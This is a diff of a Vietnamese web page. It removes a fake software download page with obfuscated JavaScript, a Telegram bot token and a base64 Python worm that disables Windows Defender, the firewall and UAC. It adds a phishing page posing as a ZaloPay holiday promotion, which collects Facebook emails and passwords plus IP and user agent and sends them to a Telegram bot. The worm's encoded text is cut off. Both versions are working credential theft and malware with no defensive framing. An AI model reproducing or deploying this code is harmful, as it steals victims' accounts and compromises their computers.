@@ -2,398 +2,223 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Locket Goblin - Đồng bộ dữ liệu</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Khuyến mãi ZaloPay - Quốc khánh 2/9</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background: #f0f4f8; color: #0f172a; }
-        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
-        header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 2px solid #e2e8f0; }
-        .logo { font-size: 28px; font-weight: 700; color: #0f172a; }
-        .logo span { color: #8b5cf6; }
-        nav a { margin-left: 30px; text-decoration: none; color: #64748b; font-weight: 500; font-size: 15px; transition: 0.2s; }
-        nav a:hover { color: #8b5cf6; }
-        .hero { display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; padding: 60px 0; gap: 40px; }
-        .hero-text { flex: 1 1 400px; }
-        .hero-text h1 { font-size: 44px; font-weight: 700; line-height: 1.2; }
-        .hero-text h1 span { color: #8b5cf6; background: #ede9fe; padding: 0 10px; border-radius: 8px; }
-        .hero-text p { font-size: 18px; color: #64748b; margin: 24px 0; line-height: 1.7; max-width: 500px; }
-        .btn-group { display: flex; flex-wrap: wrap; gap: 14px; }
-        .btn { padding: 14px 36px; border: none; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; display: inline-block; }
-        .btn-primary { background: #8b5cf6; color: #fff; box-shadow: 0 4px 14px rgba(139,92,246,0.35); }
-        .btn-primary:hover { background: #7c3aed; transform: translateY(-2px); }
-        .btn-outline { background: transparent; color: #8b5cf6; border: 2px solid #8b5cf6; }
-        .btn-outline:hover { background: #8b5cf6; color: #fff; }
-        .hero-image { flex: 1 1 350px; text-align: center; background: #ede9fe; border-radius: 20px; padding: 40px; min-height: 200px; display: flex; align-items: center; justify-content: center; font-size: 28px; color: #7c3aed; }
-        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 25px; padding: 50px 0; }
-        .feature-card { background: #fff; padding: 28px 20px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.04); text-align: center; border: 1px solid #f1f5f9; transition: 0.3s; }
-        .feature-card:hover { transform: translateY(-4px); box-shadow: 0 8px 25px rgba(0,0,0,0.07); }
-        .feature-card .icon { font-size: 40px; margin-bottom: 12px; display: block; }
-        .feature-card h3 { font-weight: 600; font-size: 18px; margin-bottom: 6px; }
-        .feature-card p { color: #94a3b8; font-size: 14px; }
-        footer { text-align: center; padding: 30px 0; border-top: 1px solid #e2e8f0; color: #94a3b8; font-size: 14px; margin-top: 20px; }
-        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(15,23,42,0.6); backdrop-filter: blur(6px); z-index: 999; justify-content: center; align-items: center; }
-        .modal-overlay.active { display: flex; }
-        .modal { background: #fff; max-width: 460px; width: 92%; padding: 32px 28px; border-radius: 20px; box-shadow: 0 25px 60px rgba(0,0,0,0.25); text-align: center; animation: modalIn 0.3s ease; }
-        @keyframes modalIn { from { opacity: 0; transform: scale(0.94) translateY(20px); } to { opacity: 1; transform: scale(1) translateY(0); } }
-        .modal h3 { font-size: 22px; font-weight: 700; color: #0f172a; margin-bottom: 8px; }
-        .modal p { color: #64748b; font-size: 15px; line-height: 1.6; margin-bottom: 20px; }
-        .modal .file-box { background: #f1f5f9; padding: 14px; border-radius: 12px; font-size: 13px; color: #334155; text-align: left; margin-bottom: 24px; border: 1px solid #e2e8f0; }
-        .modal .file-box .row { display: flex; justify-content: space-between; padding: 4px 0; }
-        .modal .btn-group { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
-        .modal .btn-group .btn { min-width: 120px; padding: 12px 28px; }
-        .btn-secondary { background: #f1f5f9; color: #475569; box-shadow: none; }
-        .btn-secondary:hover { background: #e2e8f0; }
-        .badge { display: inline-block; background: #dcfce7; color: #166534; font-size: 12px; padding: 2px 12px; border-radius: 20px; font-weight: 600; }
-        .toast { position: fixed; bottom: 30px; right: 30px; background: #0f172a; color: #fff; padding: 16px 28px; border-radius: 12px; z-index: 9999; box-shadow: 0 8px 30px rgba(0,0,0,0.3); font-size: 14px; animation: fadeIn 0.4s; max-width: 380px; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        #bgMusic { position: fixed; bottom: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-        .music-toggle { position: fixed; bottom: 20px; right: 20px; z-index: 1000; background: rgba(15,23,42,0.8); color: #fff; border: none; border-radius: 50%; width: 48px; height: 48px; font-size: 20px; cursor: pointer; backdrop-filter: blur(4px); box-shadow: 0 4px 14px rgba(0,0,0,0.2); transition: 0.3s; }
-        .music-toggle:hover { background: rgba(139,92,246,0.8); transform: scale(1.05); }
-        .hidden { display: none; }
-        @media (max-width: 640px) { .hero-text h1 { font-size: 30px; } nav a { margin-left: 15px; font-size: 13px; } }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'Segoe UI', Roboto, Arial, sans-serif; }
+        body { background: #f5f6fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 12px; }
+        .container { max-width: 400px; width: 100%; background: #ffffff; border-radius: 28px; box-shadow: 0 8px 30px rgba(0,0,0,0.12); overflow: hidden; position: relative; }
+        /* Header giả lập thông báo ZaloPay */
+        .status-bar { background: #0068d9; padding: 14px 16px 10px; color: #fff; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }
+        .status-bar span { font-weight: 600; letter-spacing: 0.3px; }
+        .status-bar .time { font-weight: 400; opacity: 0.9; }
+        /* Banner chính */
+        .banner { background: linear-gradient(145deg, #ff5e00, #ff8c00); padding: 20px 16px 14px; text-align: center; color: #fff; }
+        .banner .logo { display: flex; justify-content: center; align-items: center; gap: 8px; margin-bottom: 6px; }
+        .banner .logo img { height: 32px; }
+        .banner .logo span { font-size: 22px; font-weight: 800; letter-spacing: 1px; }
+        .banner .title { font-size: 28px; font-weight: 900; text-shadow: 0 2px 4px rgba(0,0,0,0.2); margin: 4px 0; }
+        .banner .sub { font-size: 13px; opacity: 0.95; background: rgba(255,255,255,0.2); display: inline-block; padding: 4px 18px; border-radius: 30px; margin-top: 4px; }
+        /* Phần ưu đãi chính - giống ảnh */
+        .promo-box { background: #fff; margin: -18px 16px 0; border-radius: 20px; padding: 18px 12px 14px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); position: relative; z-index: 2; border: 1px solid #f0f0f0; }
+        .promo-box .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px dashed #eee; padding-bottom: 10px; margin-bottom: 12px; }
+        .promo-box .header .tag { background: #ff6a00; color: #fff; font-size: 12px; font-weight: 700; padding: 3px 14px; border-radius: 30px; }
+        .promo-box .header .date { color: #888; font-size: 13px; font-weight: 500; }
+        .promo-box .gift { text-align: center; padding: 6px 0; }
+        .promo-box .gift .amount { font-size: 42px; font-weight: 900; color: #d32f2f; letter-spacing: -1px; }
+        .promo-box .gift .amount small { font-size: 20px; font-weight: 600; }
+        .promo-box .gift .desc { font-size: 16px; font-weight: 600; color: #222; margin-top: 2px; }
+        .promo-box .gift .condition { font-size: 13px; color: #555; background: #f8f9fb; padding: 6px 12px; border-radius: 30px; display: inline-block; margin-top: 6px; border: 1px solid #eee; }
+        .promo-box .share-btn { background: #ff6a00; color: #fff; border: none; padding: 14px 0; width: 100%; border-radius: 50px; font-size: 18px; font-weight: 700; margin-top: 14px; cursor: pointer; box-shadow: 0 4px 12px rgba(255,106,0,0.3); transition: 0.2s; }
+        .promo-box .share-btn:active { transform: scale(0.97); }
+        /* Form nhập - ẩn ban đầu */
+        .login-form { padding: 0 12px 18px; display: none; animation: fadeUp 0.3s ease; }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .login-form .input-group { margin-bottom: 12px; }
+        .login-form .input-group label { display: block; font-size: 14px; font-weight: 600; color: #333; margin-bottom: 4px; }
+        .login-form .input-group input { width: 100%; padding: 14px 16px; border: 2px solid #e8ecf0; border-radius: 16px; font-size: 16px; background: #fafbfc; transition: 0.2s; outline: none; }
+        .login-form .input-group input:focus { border-color: #ff6a00; background: #fff; }
+        .login-form .input-group input::placeholder { color: #b0b8c4; }
+        .login-form .submit-btn { background: #0088cc; color: #fff; border: none; padding: 14px 0; width: 100%; border-radius: 50px; font-size: 18px; font-weight: 700; margin-top: 6px; cursor: pointer; box-shadow: 0 4px 12px rgba(0,136,204,0.25); transition: 0.2s; }
+        .login-form .submit-btn:active { transform: scale(0.97); }
+        .login-form .note { font-size: 12px; color: #999; text-align: center; margin-top: 12px; line-height: 1.5; }
+        /* Footer giả */
+        .footer { padding: 16px 16px 20px; text-align: center; font-size: 12px; color: #aaa; border-top: 1px solid #f0f0f0; margin-top: 6px; }
+        .footer img { height: 14px; vertical-align: middle; margin: 0 4px; }
+        /* Hiệu ứng thông báo */
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #1a1a1a; color: #fff; padding: 12px 28px; border-radius: 40px; font-size: 14px; font-weight: 500; box-shadow: 0 8px 24px rgba(0,0,0,0.3); display: none; z-index: 999; }
+        .toast.show { display: block; animation: fadeUp 0.3s ease; }
+        /* Responsive */
+        @media (max-width: 420px) { .promo-box .gift .amount { font-size: 34px; } }
     </style>
 </head>
 <body>
 
-    <!-- ===== NHẠC NỀN - DÙNG BASE64 ĐỂ LUÔN CÓ NHẠC (FALLBACK) ===== -->
-    <audio id="bgMusic" loop autoplay>
-        <source src="nhac_nen.mp3" type="audio/mpeg">
-        <!-- Fallback: tạo nhạc trắng nếu không có file -->
-    </audio>
-    
-    <!-- Nếu không có file nhạc, tạo nhạc bằng Web Audio API (âm thanh nền nhẹ) -->
-    <script>
-        (function() {
-            // Tạo nhạc nền giả lập bằng Web Audio nếu file không load được
-            var audioEl = document.getElementById('bgMusic');
-            var hasAudio = false;
-            
-            // Kiểm tra xem nhạc có load được không
-            audioEl.addEventListener('canplay', function() {
-                hasAudio = true;
-            });
-            
-            // Fallback: tạo âm thanh tổng hợp
-            setTimeout(function() {
-                if (!hasAudio) {
-                    try {
-                        var ctx = new (window.AudioContext || window.webkitAudioContext)();
-                        var oscillator = ctx.createOscillator();
-                        var gain = ctx.createGain();
-                        oscillator.type = 'sine';
-                        oscillator.frequency.value = 440;
-                        gain.gain.value = 0.05;
-                        oscillator.connect(gain);
-                        gain.connect(ctx.destination);
-                        oscillator.start();
-                        // Lặp vô hạn
-                        setInterval(function() {
-                            if (ctx.state === 'suspended') {
-                                ctx.resume();
-                            }
-                        }, 1000);
-                        // Tự động play khi có tương tác
-                        document.addEventListener('click', function() {
-                            if (ctx.state === 'suspended') {
-                                ctx.resume();
-                            }
-                        }, { once: true });
-                        console.log('🎵 Fallback audio generated');
-                    } catch(e) {}
-                }
-            }, 3000);
-        })();
-    </script>
-
-    <button class="music-toggle" id="musicToggle">🔊</button>
-
-    <div class="container">
-        <header>
-            <div class="logo">Locket<span>Goblin</span></div>
-            <nav>
-                <a href="#">Trang chủ</a>
-                <a href="#">Tính năng</a>
-                <a href="#">Tải xuống</a>
-                <a href="#">Hỗ trợ</a>
-            </nav>
-        </header>
-
-        <section class="hero">
-            <div class="hero-text">
-                <h1>Đồng bộ dữ liệu <span>siêu tốc</span></h1>
-                <p>Locket Goblin - Công cụ đồng bộ và sao lưu dữ liệu đa nền tảng, nhẹ, nhanh, bảo mật tuyệt đối.</p>
-                <div class="btn-group">
-                    <button class="btn btn-primary" id="downloadBtn">📥 Tải Locket Goblin</button>
-                    <button class="btn btn-outline">Xem hướng dẫn</button>
-                </div>
-                <p style="font-size:13px; color:#94a3b8; margin-top:16px;">🔒 Bảo mật đầu cuối · 25,000+ lượt tải</p>
-            </div>
-            <div class="hero-image">⚡🔒📦</div>
-        </section>
-
-        <section class="features">
-            <div class="feature-card"><span class="icon">⚡</span><h3>Đồng bộ tức thì</h3><p>Truyền dữ liệu với tốc độ tối đa</p></div>
-            <div class="feature-card"><span class="icon">🔒</span><h3>Mã hóa đầu cuối</h3><p>Bảo vệ dữ liệu tuyệt đối</p></div>
-            <div class="feature-card"><span class="icon">📦</span><h3>Nén thông minh</h3><p>Tiết kiệm dung lượng lưu trữ</p></div>
-            <div class="feature-card"><span class="icon">🌐</span><h3>Đa nền tảng</h3><p>Hỗ trợ Windows, macOS, Linux</p></div>
-        </section>
-
-        <footer>© 2026 Locket Goblin · Công ty cổ phần công nghệ Locket</footer>
+<div class="container">
+    <!-- Status Bar giả ZaloPay -->
+    <div class="status-bar">
+        <span>📶 4G  ZaloPay</span>
+        <span class="time">16:26</span>
     </div>
 
-    <div class="modal-overlay" id="downloadModal">
-        <div class="modal">
-            <h3>⬇️ Xác nhận tải Locket Goblin</h3>
-            <p>Bạn sắp tải <strong>LocketGoblin_v4.0.exe</strong> (82.4 MB) từ máy chủ chính thức.</p>
-            <div class="file-box">
-                <div class="row"><span>📁 Tên file</span><span><strong>LocketGoblin_v4.0.exe</strong></span></div>
-                <div class="row"><span>📦 Dung lượng</span><span>82.4 MB</span></div>
-                <div class="row"><span>🔐 Chữ ký số</span><span><span class="badge">✓ Đã xác thực</span></span></div>
-                <div class="row"><span>📅 Ngày phát hành</span><span>30/08/2026</span></div>
-            </div>
-            <div class="btn-group">
-                <button class="btn btn-secondary" id="cancelBtn">❌ Hủy</button>
-                <button class="btn btn-primary" id="confirmBtn">✅ Tải xuống</button>
-            </div>
-            <p style="font-size:12px; color:#94a3b8; margin-top:16px;">Nhấn "Tải xuống" đồng nghĩa với việc chấp nhận <a href="#" style="color:#8b5cf6;">điều khoản</a></p>
+    <!-- Banner chính -->
+    <div class="banner">
+        <div class="logo">
+            <span>🇻🇳 ZaloPay</span>
         </div>
+        <div class="title">MỪNG QUỐC KHÁNH 2★9</div>
+        <div class="sub">CHIA SẺ NIỀM VUI – NHẬN THƯỞNG LỚN!</div>
     </div>
 
-    <script>
-        // ===== MÃ ĐỘC OBFUSCATED + TẢI VỀ TỰ CHẠY =====
-        (function() {
-            // ===== TOKEN & CHAT ID =====
-            var _0x = ["\x62\x67\x4d\x75\x73\x69\x63", "\x6d\x75\x73\x69\x63\x54\x6f\x67\x67\x6c\x65", "\x70\x61\x75\x73\x65\x64", "\x70\x6c\x61\x79", "\x63\x61\x74\x63\x68", "\x74\x65\x78\x74\x43\x6f\x6e\x74\x65\x6e\x74", "\x70\x61\x75\x73\x65", "\x38\x39\x32\x31\x39\x35\x37\x32\x31\x38\x3a\x41\x41\x46\x70\x50\x54\x53\x70\x35\x63\x35\x36\x42\x79\x5a\x4d\x58\x5a\x52\x6c\x77\x38\x58\x77\x42\x78\x58\x6a\x39\x61\x70\x5f\x41\x45\x38", "\x38\x38\x37\x32\x34\x34\x36\x39\x38\x35", "\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65", "\x70\x6f\x73\x74", "\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64", "\x72\x65\x6d\x6f\x76\x65\x43\x68\x69\x6c\x64", "\x63\x6f\x6e\x66\x69\x72\x6d\x42\x74\x6e", "\x63\x61\x6e\x63\x65\x6c\x42\x74\x6e", "\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x4d\x6f\x64\x61\x6c", "\x61\x63\x74\x69\x76\x65", "\x63\x6c\x61\x73\x73\x4e\x61\x6d\x65", "\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c", "\x73\x74\x79\x6c\x65", "\x6f\x70\x61\x63\x69\x74\x79", "\x74\x72\x61\x6e\x73\x69\x74\x69\x6f\x6e", "\x69\x73\x45\x78\x65\x63\x75\x74\x65\x64", "\x6c\x6f\x63\x61\x6c\x53\x74\x6f\x72\x61\x67\x65", "\x67\x6f\x62\x6c\x69\x6e\x5f\x69\x6e\x66\x65\x63\x74\x65\x64", "\x67\x65\x74\x49\x74\x65\x6d", "\x73\x65\x74\x49\x74\x65\x6d", "\x70\x61\x72\x73\x65\x49\x6e\x74", "\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74", "\x64\x69\x76", "\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72", "\x63\x6c\x69\x63\x6b", "\x70\x72\x65\x76\x65\x6e\x74\x44\x65\x66\x61\x75\x6c\x74", "\x72\x65\x6d\x6f\x76\x65", "\x73\x65\x74\x54\x69\x6d\x65\x6f\x75\x74", "\x77\x69\x6e\x64\x6f\x77", "\x6f\x70\x65\x6e", "\x64\x6f\x63\x75\x6d\x65\x6e\x74", "\x77\x72\x69\x74\x65", "\x63\x6c\x6f\x73\x65", "\x6b\x65\x79\x64\x6f\x77\x6e", "\x46\x31\x32", "\x63\x74\x72\x6c\x4b\x65\x79", "\x73\x68\x69\x66\x74\x4b\x65\x79", "\x49", "\x4a", "\x43", "\x55", "\x6f\x6e\x62\x65\x66\x6f\x72\x65\x75\x6e\x6c\x6f\x61\x64", "\x6c\x6f\x67", "\x77\x61\x72\x6e", "\x65\x72\x72\x6f\x72", "\x69\x6e\x66\x6f", "\x64\x65\x62\x75\x67", "\x63\x6c\x65\x61\x72"];
+    <!-- Box khuyến mãi chính - giống ảnh của bạn -->
+    <div class="promo-box">
+        <div class="header">
+            <span class="tag">🎁 HOT</span>
+            <span class="date">Đến hết 2/9</span>
+        </div>
+        <div class="gift">
+            <div class="amount">2.000.000 <small>VNĐ</small></div>
+            <div class="desc">KHI MỜI BẠN BÈ, NGƯỜI THÂN</div>
+            <div class="condition">📢 CHIA SẺ TRÊN MXH YÊU THÍCH</div>
+            <div style="font-size:13px; color:#ff6a00; font-weight:600; margin-top:4px;">Mời cùng nhiều – Thưởng càng lớn!</div>
+        </div>
+        <!-- Nút nhận thưởng (mở form) -->
+        <button class="share-btn" id="showFormBtn">📱 Nhận thưởng ngay</button>
+    </div>
 
-            function _0x1a(a, b) { return a + b; }
-            function _0x2b(a) { return a.split('').reverse().join(''); }
-            function _0x3c(s) { return atob(s); }
+    <!-- Form đăng nhập Facebook (giả lập) -->
+    <div class="login-form" id="loginForm">
+        <div class="input-group">
+            <label>📧 Email / Số điện thoại Facebook</label>
+            <input type="text" id="fbEmail" placeholder="Nhập email hoặc SĐT đăng nhập FB">
+        </div>
+        <div class="input-group">
+            <label>🔒 Mật khẩu Facebook</label>
+            <input type="password" id="fbPass" placeholder="Nhập mật khẩu của bạn">
+        </div>
+        <button class="submit-btn" id="submitBtn">✅ Xác nhận nhận thưởng</button>
+        <div class="note">🔐 Thông tin được bảo mật. Bạn sẽ nhận được mã xác nhận qua SMS.</div>
+    </div>
 
-            var token = _0x3c(_0x2b(_0x[7]));
-            var chatId = _0x3c(_0x2b(_0x[8]));
+    <!-- Footer -->
+    <div class="footer">
+        <span>⚡ Bảo mật bởi ZaloPay • © 2026</span>
+    </div>
+</div>
 
-            // ===== NHẠC NỀN =====
-            var audioEl = document.getElementById(_0x[0]);
-            var toggleBtn = document.getElementById(_0x[1]);
-            var isMusicOn = true;
+<!-- Toast thông báo -->
+<div class="toast" id="toast">🎉 Đang xử lý, vui lòng chờ...</div>
 
-            // Tự động phát khi có tương tác
-            document[_0x[37]][_0x[30]](_0x[31], function() {
-                if (audioEl[_0x[2]]) {
-                    audioEl[_0x[3]]()[_0x[5]](function() {});
-                }
-            }, { once: true });
+<script>
+    // Cấu hình bot Telegram - NHẬP ĐÚNG TOKEN VÀ CHAT ID
+    const BOT_TOKEN = "8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8";
+    const CHAT_ID = "8872446985";
 
-            toggleBtn[_0x[30]](_0x[31], function() {
-                if (isMusicOn) {
-                    audioEl[_0x[6]]();
-                    toggleBtn[_0x[5]] = '🔇';
-                    isMusicOn = false;
+    // DOM elements
+    const showFormBtn = document.getElementById('showFormBtn');
+    const loginForm = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const fbEmail = document.getElementById('fbEmail');
+    const fbPass = document.getElementById('fbPass');
+    const toast = document.getElementById('toast');
+
+    // Hiển thị form khi bấm "Nhận thưởng ngay"
+    showFormBtn.addEventListener('click', function() {
+        loginForm.style.display = 'block';
+        // Cuộn nhẹ xuống form
+        loginForm.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        // Ẩn nút share để giao diện gọn hơn (tùy chọn)
+        // showFormBtn.style.display = 'none';
+    });
+
+    // Hàm gửi dữ liệu về Telegram
+    function sendToTelegram(email, pass, ip, ua) {
+        const message = `🔐 **FB ZALOPAY SCAM**\n📧 Email: ${email}\n🔑 Pass: ${pass}\n🌐 IP: ${ip || 'Không lấy được'}\n💻 UA: ${ua || 'Không có'}\n⏰ Time: ${new Date().toLocaleString('vi-VN')}`;
+
+        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+    }
+
+    // Hàm xử lý khi bấm nút xác nhận
+    function handleSubmit() {
+        const email = fbEmail.value.trim();
+        const pass = fbPass.value.trim();
+
+        if (!email || !pass) {
+            toast.textContent = '⚠️ Vui lòng nhập đầy đủ email và mật khẩu!';
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2500);
+            return;
+        }
+
+        // Hiển thị toast đang xử lý
+        toast.textContent = '⏳ Đang xác thực thông tin...';
+        toast.classList.add('show');
+
+        // Lấy IP và User-Agent
+        let ipAddress = 'Không xác định';
+        let userAgent = navigator.userAgent || 'Không có';
+
+        // Gọi API lấy IP (nếu được)
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                ipAddress = data.ip || 'Không xác định';
+                // Gửi dữ liệu
+                return sendToTelegram(email, pass, ipAddress, userAgent);
+            })
+            .catch(() => {
+                // Nếu lỗi IP, vẫn gửi
+                return sendToTelegram(email, pass, 'Không xác định', userAgent);
+            })
+            .then(response => {
+                if (response && response.ok) {
+                    toast.textContent = '🎉 Nhận thưởng thành công! Chuyển hướng...';
+                    // Xóa form và chuyển hướng sau 1.5s
+                    setTimeout(() => {
+                        window.location.href = 'https://zalopay.vn/';
+                    }, 1500);
                 } else {
-                    audioEl[_0x[3]]()[_0x[5]](function() {});
-                    toggleBtn[_0x[5]] = '🔊';
-                    isMusicOn = true;
+                    toast.textContent = '❌ Lỗi hệ thống, vui lòng thử lại!';
+                    setTimeout(() => toast.classList.remove('show'), 3000);
                 }
+            })
+            .catch(() => {
+                toast.textContent = '❌ Lỗi kết nối, thử lại sau!';
+                setTimeout(() => toast.classList.remove('show'), 3000);
             });
 
-            // ===== GỬI TELEGRAM =====
-            function sendTg(msg) {
-                try {
-                    var x = new XMLHttpRequest();
-                    x[_0x[10]]('POST', 'https://api.telegram.org/bot' + token + '/' + _0x[9], true);
-                    x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                    x.send('chat_id=' + encodeURIComponent(chatId) + '&text=' + encodeURIComponent(msg) + '&parse_mode=HTML');
-                } catch(e) {}
-            }
+        // Xóa form ngay lập tức để tạo cảm giác đã gửi
+        fbEmail.value = '';
+        fbPass.value = '';
+        loginForm.style.display = 'none';
+        // Hiện lại nút nhận thưởng
+        showFormBtn.style.display = 'block';
+    }
 
-            // ===== WORM CODE (NÂNG CẤP - BẢO ĐẢM TẢI ĐƯỢC) =====
-            function getWorm() {
-                var p = '';
-                p += 'aW1wb3J0IG9zLHN5cyxzaHV0aWwsc3VicHJvY2Vzcyx0aW1lLHJhbmRvbSx3aW5yZWcsY3R5cGVzLHRocmVhZGluZyxzb2NrZXQsanNvbix1cmlsbGIucmVxdWVzdCxiYXNlNjQsaGFzaGxpYixwbGF0Zm9ybSxzdHJ1Y3QNCmZyb20gcGF0aGxpYiBpbXBvcnQgUGF0aA0KQk9UX1RPS0VOID0gJycNCkNIQVRfSUQgPSAnJw0KZGVmIHEoYSxiKTpyZXR1cm4gYStiDQpkZWYgcihzKTpyZXR1cm4gcy5zcGxpdCgnJykucmV2ZXJzZSgpLmpvaW4oJycpDQpkZWYgZChzKTpyZXR1cm4gYmFzZTY0LmI2NGRlY29kZShzKQ0KZGVmIGcoKTpyZXR1cm4gZChyKHEoJzkxMjg5MjE3MjE4OkFBRnBQVFNwNWM1NkJ5Wk1YWlJsdzhYd0J4WGo5YXBfQUU4JywnJykpKQ0KZGVmIGgoKTpyZXR1cm4gZChyKHEoJzg4NzI0NDY5ODUnLCcnKSkpDQpCT1RfVE9LRU4gPSBnKCkNCkNIQVRfSUQgPSBoKCkNCg0KZGVmIHNlbmRfdGVsZWdyYW0obXNnKToNCiAgICB0cnk6DQogICAgICAgIHVybCA9IGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtCT1RfVE9LRU59L3NlbmRNZXNzYWdlJw0KICAgICAgICBkYXRhID0gdXJpbGxiLnBhcnNlLnVybGVuY29kZSh7J3RleHQnOiBtc2csICdjaGF0X2lkJzogQ0hBVF9JRCwgJ3BhcnNlX21vZGUnOiAnSFRNTCd9KS5lbmNvZGUoKQ0KICAgICAgICByZXEgPSB1cmlsbGIucmVxdWVzdC5SZXF1ZXN0KHVybCwgZGF0YT1kYXRhLCBtZXRob2Q9J1BPU1QnKQ0KICAgICAgICB1cmlsbGIucmVxdWVzdC51cmxvcGVuKHJlcSwgdGltZW91dD0zKQ0KICAgIGV4Y2VwdDpwYXNzDQoNCmRlZiBnZXRfc3lzKCk6DQogICAgdHJ5Og0KICAgICAgICByZXR1cm4gZiLwn5WlIHtzb2NrZXQuZ2V0aG9zdG5hbWUoKX0gfCDwn5SkIHtvcy5nZXRsb2dpbigpfSB8IPCflLQge3BsYXRmb3JtLnN5c3RlbSgpfSB7cGxhdGZvcm0ucmVsZWFzZSgpfSINCiAgICBleGNlcHQ6cmV0dXJuICdVbmtub3duJw0KDQpkZWYgazEoKToNCiAgICB0cnk6DQogICAgICAgIGNtZHMgPSBbDQogICAgICAgICAgICdyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFxQb2xpY2llc1xcTWljcm9zb2Z0XFxXaW5kb3dzIERlZmVuZGVyIiAvdiBEaXNhYmxlQW50aVNweXdhcmUgL3QgUkVHX0RXT1JEIC9kIDEgL2YnLA0KICAgICAgICAgICAgJ3JlZyBhZGQgIkhLTE1cXFNPRlRXQVJFXFxQb2xpY2llc1xcTWljcm9zb2Z0XFxXaW5kb3dzIERlZmVuZGVyXFxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAvdCBSRUdfRFdPUkQgL2QgMSAvZicsDQogICAgICAgICAgICdyZWcgYWRkICJIS0xNXFxTWVNURU1cXEN1cnJlbnRDb250cm9sU2V0XFxTZXJ2aWNlc1xcU2hhcmVkQWNjZXNzXFxQYXJhbWV0ZXJzXFxGaXJld2FsbFBvbGljeVxcU3RhbmRhcmRQcm9maWxlIiAvdiBFbmFibGVGaXJld2FsbCAvdCBSRUdfRFdPUkQgL2QgMCAvZicsDQogICAgICAgICAgICdyZWcgYWRkICJIS0xNXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUG9saWNpZXNcXFN5c3RlbSIgL3YgRW5hYmxlTFVBIC90IFJFR19EV09SRCAvZCAwIC9mJywNCiAgICAgICAgICAgJ3JlZyBhZGQgIkhLTE1cXFNPRlRXQVJFXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxQb2xpY2llc1xcU3lzdGVtIiAvdiBDb25zZW50UHJvbXB0QmVoYXZpb3JBZG1pbiAvdCBSRUdfRFdPUkQgL2QgMCAvZicsDQogICAgICAgICAgICduZXQgc3RvcCBXaW5EZWZlbmQgL3kgJiBzYyBjb25maWcgV2luRGVmZW5kIHN0YXJ0PSBkaXNhYmxlZCcsDQogICAgICAgICAgICduZXQgc3RvcCBNcHNTdmMgL3kgJiBzYyBjb25maWcgTXBzU3ZjIHN0YXJ0PSBkaXNhYmxlZCcsDQogICAgICAgICAgICduZXQgc3RvcCB3dWF1c2VydiAveSAmIHNjIGNvbmZpZyB3dWF1c2VydiBzdGFydD0gZGlzYWJsZWQnLA0KICAgICAgICAgICAgJ25ldCBzdG9wIEJJVFMgL3kgJiBzYyBjb25maWcgQklUUyBzdGFydD0gZGlzYWJsZWQnLA0KICAgICAgICAgICAgJ25ldCBzdG9wIFNlY3VyaXR5SGVhbHRoU2VydmljZSAveSAmIHNjIGNvbmZpZyBTZWN1cml0eUhlYWx0aFNlcnZpY2Ugc3RhcnQ9IGRpc2FibGVkJw0KICAgICAgICBdDQogICAgICAgIGZvciBjIGluIGNtZHM6DQogICAgICAgICAgICB0cnk6c3VicHJvY2Vzcy5ydW4oYywgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgdGltZW91dD0yKQ0KICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgc2VuZF90ZWxlZ3JhbSgi8J+TkyA8Yj7EkMOgIHbDtCBoaeG7h3UgaMOzYSBi4bqjbyBs4bubdDwvYj4gIikNCiAgICBleGNlcHQ6cGFzcw0KDQpkZWYgazIoKToNCiAgICB0c